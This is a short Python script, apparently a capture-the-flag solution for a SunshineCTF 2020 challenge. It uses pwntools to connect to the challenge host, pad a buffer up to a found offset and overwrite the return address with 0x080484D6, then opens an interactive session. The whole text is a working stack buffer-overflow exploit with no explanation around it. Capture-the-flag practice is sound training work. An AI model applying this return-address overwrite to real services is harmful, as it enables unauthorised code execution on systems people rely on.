from pwn import *

p = remote("chal.2020.sunshinectf.org", 30002)
buf = b''
buf += cyclic(cyclic_find(p32(0x61616175)))
buf += p32(0x080484D6)

p.sendline(buf)
p.interactive()
